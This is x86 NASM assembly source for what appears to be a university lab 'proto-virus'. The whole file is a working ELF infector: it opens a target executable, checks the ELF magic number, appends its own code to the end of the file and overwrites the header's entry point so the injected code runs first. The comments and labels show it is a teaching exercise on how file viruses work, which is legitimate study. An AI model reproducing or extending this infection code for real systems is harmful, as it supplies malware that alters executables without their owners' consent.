%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28

;Stack Location macros:
%define FD dword [ebp-4]
%define ELFHDR ebp-56
%define STDOUT 1

	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;CODE START

	open FileName, RDWR, 0x777  ; open file
	cmp eax, 0					; check for error on open
	jg Exit_Sucsses				; we got a file description, therefore we opened the file, so infect it
	
	call get_my_loc	
	sub ecx,next_i - OutStr		; get outstr address
	mov esp, ecx				; put address of ecx to esp
	write STDOUT,esp,32			; print stdout
	jmp VirusExit

Exit_Sucsses:
	mov FD, eax					; save file desc in FD
	
	lea ecx, [ELFHDR]			; load ELFHDR address to ecx		
	read FD, ecx, ELFHDR_size	; read from FD file ELFHDR_size(52) bytes to ecx

	cmp dword [ELFHDR], 0x464C457F 		;compare the megic number of ELFHDR
	jne Exit_Failure

	write STDOUT, OutStr, 32
	lseek FD, 0, SEEK_END		; Points FD to end of file and puts in eax FD size
	mov edx, virus_end - _start ; calculate and save virus size
	mov esi, eax				; EAX holds the size of FD file, and now puts it in esi(not system register)
	call get_my_loc				; put in ecx adress of next_i
	sub ecx, next_i - _start	; put in ecx address of (next_i - (next_i - start))=start
	write FD, ecx ,edx			; write in FD from ecx , edx bites

	; change entry
	lseek FD,0,SEEK_SET			; we do this first because this changes ecx
	mov eax, esi				; move file size to eax
	add eax, 0x8048000			; add the file size to put the new entry address in eax
	mov dword [ELFHDR + ENTRY],eax ; write the address in the header instead of the real entry address
	lea ecx, [ELFHDR]			; load the header address to ecx
	write FD,ecx,ELFHDR_size	; write the entire rewritten header into file

	close FD
	jmp VirusExit

Exit_Failure:
	write STDOUT, Failstr, 12
	close FD
	jmp VirusExit

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec2", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0

get_my_loc:
	call next_i

next_i:
	pop ecx
	ret	

PreviousEntryPoint: dd VirusExit
virus_end: